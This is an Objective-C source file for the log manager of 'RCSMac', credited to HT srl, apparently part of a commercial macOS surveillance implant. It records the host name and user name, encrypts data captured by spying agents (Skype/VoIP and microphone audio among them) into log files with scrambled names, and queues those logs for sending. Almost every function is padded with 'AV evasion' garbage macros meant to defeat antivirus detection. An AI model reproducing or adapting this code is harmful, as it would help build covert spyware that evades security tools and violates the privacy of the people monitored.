/*
 * RCSMac - Log Manager
 *  Logging facilities, this class is a singleton which will be referenced
 *  by all the single agents providing ways for writing log data per agentID
 *  or agentLogFileHandle.
 *
 *
 *  - Provide all the instance methods in order to access and remove items from
 *    the queues without the needs for external objects to access the queue
 *    directly, aka Keep It Pr1v4t3!
 *
 * Created by Alfredo 'revenge' Pesoli on 16/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>

#import "RCSMLogManager.h"
#import "RCSMEncryption.h"
#import "RCSMDiskQuota.h"
#import "RCSMGlobals.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

static NSLock *gActiveQueueLock;
static NSLock *gSendQueueLock;

static __m_MLogManager *sharedLogManager = nil;

@interface __m_MLogManager (hidden)

- (BOOL)_addLogToQueue: (u_int)agentID queue: (int)queueType;
- (BOOL)_removeLogFromQueue: (u_int)agentID queue: (int)queueType;
- (NSData *)_createLogHeader: (u_int)agentID
                   timestamp: (int64_t)fileTime
                 agentHeader: (NSData *)anAgentHeader;
//- (int)_getLastLogSequenceNumber;

@end

@implementation __m_MLogManager (hidden)

- (BOOL)_addLogToQueue: (u_int)agentID queue: (int)queueType
{  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return TRUE;
}

- (BOOL)_removeLogFromQueue: (u_int)agentID queue: (int)queueType
{
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return TRUE;
}

- (NSData *)_createLogHeader: (u_int)agentID
                   timestamp: (int64_t)fileTime
                 agentHeader: (NSData *)anAgentHeader
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  
  //NSString *hostName = [[NSHost currentHost] name];
  
  char tempHost[100];
  NSString *hostName;
  if (gethostname(tempHost, 100) == 0)
    hostName = [[NSString alloc] initWithCString: tempHost];
  else
    hostName = @"EMPTY";
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSString *userName = NSUserName();
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(logStruct)];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
#ifdef DEBUG_LOG_MANAGER
  infoLog(@"logStruct: %d", sizeof(logStruct));
#endif
  logStruct *logRawHeader = (logStruct *)[logHeader bytes];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  switch (agentID)
    {
      case AGENT_VOIP + VOIP_SKYPE + SKYPE_CHANNEL_INPUT:
      case AGENT_VOIP + VOIP_SKYPE + SKYPE_CHANNEL_OUTPUT:
        {
          agentID = AGENT_VOIP;
          break;
        }
      default:
        {
          break;
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  logRawHeader->version         = LOG_VERSION;
  logRawHeader->type            = agentID;
  logRawHeader->hiTimestamp     = (int64_t)fileTime >> 32;
  logRawHeader->loTimestamp     = (int64_t)fileTime & 0xFFFFFFFF;
  logRawHeader->deviceIdLength  = [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  logRawHeader->userIdLength    = [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  logRawHeader->sourceIdLength  = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  if (anAgentHeader != nil && anAgentHeader != 0)
    logRawHeader->additionalDataLength = [anAgentHeader length];
  else
    logRawHeader->additionalDataLength = 0;

  int headerLength = sizeof(logStruct)
                      + logRawHeader->deviceIdLength
                      + logRawHeader->userIdLength
                      + logRawHeader->sourceIdLength
                      + logRawHeader->additionalDataLength;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  int paddedLength = headerLength;

  if (paddedLength % kCCBlockSizeAES128)
    {
      int pad = (paddedLength + kCCBlockSizeAES128 & ~(kCCBlockSizeAES128 - 1)) - paddedLength;
      paddedLength += pad;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  paddedLength += sizeof(int);
  
  if (paddedLength < headerLength)
    {
      [logHeader release];
      [outerPool release];
      return nil;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  NSMutableData *rawHeader = [[NSMutableData alloc] initWithCapacity: [logHeader length]
                              + [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                              + [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                              + [anAgentHeader length]];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // Clear dword at the start of the file which specifies the size of the
  // unencrypted data
  headerLength = paddedLength - sizeof(int);

  [rawHeader appendData: logHeader];
  [rawHeader appendData: [hostName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [rawHeader appendData: [userName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [hostName release];
  [logHeader release];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (anAgentHeader != nil)
    [rawHeader appendData: anAgentHeader];

  NSData *temp = [[NSData alloc] initWithBytes: gLogAesKey
                                        length: CC_MD5_DIGEST_LENGTH];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  CCCryptorStatus result = 0;
  
  // no padding on aligned blocks
  result = [rawHeader __encryptWithKey: temp];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [temp release];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  if (result == kCCSuccess)
    {
      NSMutableData *header = [[NSMutableData alloc] initWithCapacity: headerLength + sizeof(int)];
      [header appendBytes: &headerLength length: sizeof(headerLength)];
      [header appendData: rawHeader];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      [rawHeader release];
      [outerPool release];
      
      return [header autorelease];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [outerPool release];  
  return nil;
}

@end


@implementation __m_MLogManager

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MLogManager *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedLogManager == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedLogManager;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedLogManager == nil)
      {
        sharedLogManager = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedLogManager;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
    {
      if (sharedLogManager != nil)
        {
          self = [super init];
          
          if (self != nil)
            {
              mActiveQueue = [[NSMutableArray alloc] init];
              mSendQueue = [[NSMutableArray alloc] init];
              mTempQueue = [[NSMutableArray alloc] init];
              
#ifdef DEV_MODE
              unsigned char result[CC_MD5_DIGEST_LENGTH];
              CC_MD5(gLogAesKey, strlen(gLogAesKey), result);
              
              NSData *temp = [NSData dataWithBytes: result
                                            length: CC_MD5_DIGEST_LENGTH];
#else
              NSData *temp = [NSData dataWithBytes: gLogAesKey
                                            length: CC_MD5_DIGEST_LENGTH];
#endif
              
              mEncryption = [[__m_MEncryption alloc] initWithKey: temp];
              
              gActiveQueueLock = [[NSLock alloc] init];
              gSendQueueLock   = [[NSLock alloc] init];
            }
          
          sharedLogManager = self;
        }
    }
  
  return sharedLogManager;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

#pragma mark -
#pragma mark Logging facilities
#pragma mark -

- (BOOL)createLog: (u_int)agentID
      agentHeader: (NSData *)anAgentHeader
        withLogID: (u_int)logID
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  BOOL success;
  NSError *error;
  
  int64_t filetime;
  NSString *encryptedLogName;
  
  usleep(30000);
  
  int32_t hiPart;
  int32_t loPart;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  do
    {
      time_t unixTime;
      time(&unixTime);
#ifdef DEBUG_LOG_MANAGER
      infoLog(@"unixTime: %x", unixTime);
#endif
      filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
#ifdef DEBUG_LOG_MANAGER
      infoLog(@"TIME: %x", (int64_t)filetime);
#endif
      hiPart = (int64_t)filetime >> 32;
      loPart = (int64_t)filetime & 0xFFFFFFFF;
      
#ifdef DEBUG_LOG_MANAGER
      infoLog(@"hiPart: %x", hiPart);
      infoLog(@"loPart: %x", loPart);
#endif
      NSString *logName = [[NSString alloc] initWithFormat: @"LOGF_%.4X_%.8X%.8X.log",
                                                            agentID,
                                                            hiPart,
                                                            loPart];
#ifdef DEBUG_LOG_MANAGER
      infoLog(@"LogName: %@", logName);
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      encryptedLogName = [NSString stringWithFormat: @"%@/%@",
                          [[NSBundle mainBundle] bundlePath],
                          [mEncryption scrambleForward: logName
                                                  seed: gLogAesKey[0]]];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      [logName release];
    }
  while ([[NSFileManager defaultManager] fileExistsAtPath: encryptedLogName] == TRUE);
  
  [encryptedLogName retain];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
#ifdef DEBUG_LOG_MANAGER
  infoLog(@"Creating log: %@", encryptedLogName);
  infoLog(@"anAgentHeader: %@", anAgentHeader);
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  success = [@"" writeToFile: encryptedLogName
                  atomically: NO
                    encoding: NSUnicodeStringEncoding
                       error: &error];
  
#ifdef WRITE_CLEAR_TEXT_LOG
  NSString *logName = [[NSString alloc] initWithFormat: @"LOGF_%.4X_%.8X%.8X.log",
                                                        agentID,
                                                        hiPart,
                                                        loPart];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  NSString *logPath = [NSString stringWithFormat: @"%@/%@",
                       [[NSBundle mainBundle] bundlePath], logName];
                                              
  infoLog(@"Creating clear text file: %@", logName);
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [@"" writeToFile: logPath
        atomically: NO
          encoding: NSUnicodeStringEncoding
             error: nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSFileHandle *clearTextHandle = [NSFileHandle fileHandleForUpdatingAtPath: logPath];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (clearTextHandle)
    {
      infoLog(@"Handle for clear text log acquired correctly");
    }
  else
    {
      infoLog(@"An error occurred while obtaining handle for clear text log");
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [logName release];
#endif
  
  if (success == YES)
  {  
    // AV evasion: only on release build
    AV_GARBAGE_003
    
      NSFileHandle *logFileHandle = [NSFileHandle fileHandleForUpdatingAtPath:
                                     encryptedLogName];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
      if (logFileHandle)
        {
#ifdef DEBUG_LOG_MANAGER
          infoLog(@"LogHandle acquired");
#endif
          NSNumber *agent   = [[NSNumber alloc] initWithUnsignedInt: agentID];
          NSNumber *_logID  = [[NSNumber alloc] initWithUnsignedInt: logID];
          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
#ifdef WRITE_CLEAR_TEXT_LOG
          NSArray *keys = [NSArray arrayWithObjects: @"agentID",
                                                     @"logID",
                                                     @"logName",
                                                     @"handle",
                                                     @"clearHandle",
                                                     @"header",
                                                     nil];
#else
          NSArray *keys = [NSArray arrayWithObjects: @"agentID",
                                                     @"logID",
                                                     @"logName",
                                                     @"handle",
                                                     @"header",
                                                     nil];
#endif
          NSArray *objects;
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          if (anAgentHeader == nil)
            {
#ifdef WRITE_CLEAR_TEXT_LOG
              objects = [NSArray arrayWithObjects: agent,
                                                   _logID,
                                                   encryptedLogName,
                                                   logFileHandle,
                                                   clearTextHandle,
                                                   @"NO",
                                                   nil];
#else
              objects = [NSArray arrayWithObjects: agent,
                                                   _logID,
                                                   encryptedLogName,
                                                   logFileHandle,
                                                   @"NO",
                                                   nil];
#endif
            }
          else
            {
#ifdef WRITE_CLEAR_TEXT_LOG
              objects = [NSArray arrayWithObjects: agent,
                                                   _logID,
                                                   encryptedLogName,
                                                   logFileHandle,
                                                   clearTextHandle,
                                                   anAgentHeader,
                                                   nil];
#else
              objects = [NSArray arrayWithObjects: agent,
                                                   _logID,
                                                   encryptedLogName,
                                                   logFileHandle,
                                                   anAgentHeader,
                                                   nil];
#endif
            }
          
          NSMutableDictionary *agentLog = [[NSMutableDictionary alloc] init];
          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                                 forKeys: keys];
          [agentLog addEntriesFromDictionary: dictionary];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          [gActiveQueueLock lock];
          [mActiveQueue addObject: agentLog];
          [gActiveQueueLock unlock];
          
          [agent release];
          [_logID release];
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
#ifdef DEBUG_LOG_MANAGER
          infoLog(@"activeQueue from Create: %@", mActiveQueue);
#endif
          
          //
          // logHeader contains the whole encrypted header
          // first dword is in clear text (padded size)
          //
          NSData *logHeader = [self _createLogHeader: agentID
                                           timestamp: filetime
                                         agentHeader: anAgentHeader];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          if (logHeader == nil)
            {
#ifdef DEBUG_LOG_MANAGER
              infoLog(@"An error occurred while creating log Header");
#endif   
              [agentLog release];
              [outerPool release];
              [encryptedLogName release];
              
              return FALSE;
            }
#ifdef DEBUG_LOG_MANAGER
          infoLog(@"encrypted Header: %@", logHeader);
#endif
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          if ([self writeDataToLog: logHeader
                         forHandle: logFileHandle] == FALSE)
            {
              [agentLog release];
              [encryptedLogName release];
              return FALSE;
            }
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          [agentLog release];
          [encryptedLogName release];
          [outerPool release];
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          return TRUE;
        }
    }

#ifdef DEBUG_LOG_MANAGER
  infoLog(@"An error occurred while creating the log file");
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [encryptedLogName release];
  [outerPool release];
  
  return FALSE;
}

- (BOOL)writeDataToLog: (NSData *)aData forHandle: (NSFileHandle *)anHandle
{  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  @try
  {
    [anHandle writeData: aData];
    
    // increment disk quota
    [[__m_MDiskQuota sharedInstance] incUsed: [aData length]];
  }
  @catch (NSException *e)
  {
#ifdef DEBUG_LOG_MANAGER
    infoLog(@"%s exception", __FUNCTION__);
#endif
    
    return FALSE;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return TRUE;
}

- (BOOL)writeDataToLog: (NSMutableData *)aData
              forAgent: (u_int)agentID
             withLogID: (u_int)logID
{
  BOOL logFound = FALSE;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [gActiveQueueLock lock];
  NSEnumerator *enumerator = [mActiveQueue objectEnumerator];
  [gActiveQueueLock unlock];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  id anObject;
  
  while (anObject = [enumerator nextObject])
  {
    if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID
        && ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
    {
      logFound = TRUE;
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      NSFileHandle *logHandle = [anObject objectForKey: @"handle"];
      
      NSData *temp = [NSData dataWithBytes: gLogAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      int _blockSize = [aData length];
      NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
                                         length: sizeof(int)];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
#ifdef WRITE_CLEAR_TEXT_LOG
      NSFileHandle *clearHandle = [anObject objectForKey: @"clearHandle"];
      [clearHandle writeData: blockSize];
      [clearHandle writeData: aData];
#endif
      
      CCCryptorStatus result = 0;
      result = [aData __encryptWithKey: temp];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      if (result == kCCSuccess)
      {
        // Writing the size of the clear text block
        [logHandle writeData: blockSize];
        // then our log data
        [logHandle writeData: aData];
        
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        // increment disk quota
        [[__m_MDiskQuota sharedInstance] incUsed: [aData length] + sizeof(blockSize)];
        
        break;
      }
    }
  }
  
  //
  // If logFound is false and we called this function, it means that the agent
  // is running but no file was created, thus we need to do it here
  //
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  //
  // TODO: There's a non-issue race condition here, this means that two files
  // could be created instead of one if the sync is running and closeActiveLogs
  // has been called by passing TRUE for continueLogging
  //
  if (logFound == FALSE)
  {
    return FALSE;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  return TRUE;
}

- (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging
{
  NSMutableIndexSet *discardedItem  = [NSMutableIndexSet indexSet];
  NSMutableArray *newItems          = [[NSMutableArray alloc] init];
  NSMutableArray *tempAgentsConf    = [[NSMutableArray alloc] init];
  NSUInteger index                  = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  id item;
  
  for (item in mActiveQueue)
  {  
    // AV evasion: only on release build
    AV_GARBAGE_004
    
      int32_t agentID = [[item objectForKey: @"agentID"] intValue];

      if (continueLogging == YES
          && (agentID == AGENT_VOIP
          ||  agentID == AGENT_MICROPHONE))
        {
          //
          // Close all the logs except the Audio ones
          //
#ifdef DEBUG_LOG_MANAGER
          warnLog(@"Skipping Audio Log");
#endif
          continue;
        }
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
      [[item objectForKey: @"handle"] closeFile];
      [newItems addObject: item];
      [discardedItem addIndex: index];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
      //
      // Verifying if we need to recreate the log entry so that the agents can
      // keep logging (verify for possible races here)
      //
      if (continueLogging == TRUE)
        {
          NSNumber *tempAgentID = [NSNumber numberWithInt:
                                   [[item objectForKey: @"agentID"] intValue]];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          id tempAgentHeader = [item objectForKey: @"header"];
          
          NSArray *keys = [NSArray arrayWithObjects: @"agentID",
                           @"header",
                           nil];
          NSArray *objects = [NSArray arrayWithObjects: tempAgentID,
                              tempAgentHeader,
                              nil];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          NSMutableDictionary *agent = [[NSMutableDictionary alloc] init];
          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                                 forKeys: keys];
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          [agent addEntriesFromDictionary: dictionary];
          [tempAgentsConf addObject: agent];
          [agent release];
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
        }
      
      index++;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [gActiveQueueLock lock];
  [gSendQueueLock lock];
  
  [mActiveQueue removeObjectsAtIndexes: discardedItem];
  [mSendQueue addObjectsFromArray: newItems];
  
  [gSendQueueLock unlock];
  [gActiveQueueLock unlock];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (continueLogging == TRUE)
    {
#ifdef DEBUG_LOG_MANAGER
      infoLog(@"Recreating agents log");
#endif  
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      for (id agent in tempAgentsConf)
        {
          id agentHeader = [agent objectForKey: @"header"];
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          if ([agentHeader isKindOfClass: [NSString class]])
            {
              if ([agentHeader isEqualToString: @"NO"])
                {
#ifdef DEBUG_LOG_MANAGER
                  infoLog(@"No Agent Header found");
#endif
                  [self createLog: [[agent objectForKey: @"agentID"] intValue]
                      agentHeader: nil
                        withLogID: [[agent objectForKey: @"logID"] intValue]];
                }
            }
          else if ([agentHeader isKindOfClass: [NSData class]])
            {
#ifdef DEBUG_LOG_MANAGER
              infoLog(@"agentHeader (%@)", [agentHeader class]);
              infoLog(@"agentHeader = %@", agentHeader);
#endif
              
              // AV evasion: only on release build
              AV_GARBAGE_003
              
              NSData *_agentHeader = [[NSData alloc] initWithData: [agent objectForKey: @"header"]];
              
              [self createLog: [[agent objectForKey: @"agentID"] intValue]
                  agentHeader: _agentHeader
                    withLogID: [[agent objectForKey: @"logID"] intValue]];
              
              // AV evasion: only on release build
              AV_GARBAGE_002
              
              [_agentHeader release];
            }
        }
    }
  
#ifdef DEBUG_LOG_MANAGER
  infoLog(@"Logs recreated correctly");
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [newItems release];
  [tempAgentsConf release];
  
  return TRUE;
}

- (BOOL)closeActiveLog: (u_int)agentID
             withLogID: (u_int)logID
{
  NSMutableIndexSet *discardedItem  = [NSMutableIndexSet indexSet];
  NSUInteger index                  = 0;
  id anObject;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  for (anObject in mActiveQueue)
  {  
    // AV evasion: only on release build
    AV_GARBAGE_002
    
      if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID
          && ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
        {
#ifdef DEBUG_LOG_MANAGER
          infoLog(@"Closing Log %@", [anObject objectForKey: @"logName"]);
#endif
          [[anObject objectForKey: @"handle"] closeFile];

#ifdef WRITE_CLEAR_TEXT_LOG
          [[anObject objectForKey: @"clearHandle"] closeFile];
#endif
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          //
          // Now put the log in the sendQueue and remove it from the active queue
          //
#ifdef DEBUG_LOG_MANAGER
          infoLog(@"mSendQueue: %@", mSendQueue);
          infoLog(@"mActiveQueue: %@", mActiveQueue);
#endif
          [discardedItem addIndex: index];
          
          [gActiveQueueLock lock];
          [gSendQueueLock lock];
          
          [mSendQueue addObject: anObject];
          [mActiveQueue removeObjectsAtIndexes: discardedItem];
          
          [gSendQueueLock unlock];
          [gActiveQueueLock unlock];
          
#ifdef DEBUG_LOG_MANAGER
          infoLog(@"mSendQueue: %@", mSendQueue);
          infoLog(@"mActiveQueue: %@", mActiveQueue);
#endif
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          return TRUE;
        }
      index++;
    }
  
  usleep(80000);
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return FALSE;
}

- (BOOL)removeSendLog: (u_int)agentID
            withLogID: (u_int)logID
{
#ifdef DEBUG_LOG_MANAGER
  infoLog(@"Removing Log Entry from the Send queue");
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSMutableIndexSet *discardedItem = [NSMutableIndexSet indexSet];
  NSUInteger index = 0;
  
  id item;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  for (item in mSendQueue)
    {
      if ([[item objectForKey: @"agentID"] unsignedIntValue] == agentID
          && ([[item objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
        {
          [discardedItem addIndex: index];
          break;
        }
      
      index++;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [mSendQueue removeObjectsAtIndexes: discardedItem];
  
  return TRUE;
}

#pragma mark -
#pragma mark Accessors
#pragma mark -

- (NSEnumerator *)getSendQueueEnumerator
{
  NSEnumerator *enumerator;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [gSendQueueLock lock];
  
  if ([mSendQueue count] > 0)
    enumerator = [[[mSendQueue copy] autorelease] objectEnumerator];
  else
    enumerator = nil;
  
  [gSendQueueLock unlock];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  return enumerator;
}

- (NSMutableArray *)mActiveQueue
{
  return mActiveQueue;
}

- (NSEnumerator *)getActiveQueueEnumerator
{
  NSEnumerator *enumerator;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [gActiveQueueLock lock];

  if ([mActiveQueue count] > 0)
    enumerator = [[[mActiveQueue copy] autorelease] objectEnumerator];
  else
    enumerator = nil;
  
  [gActiveQueueLock unlock];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return enumerator;
}


@end
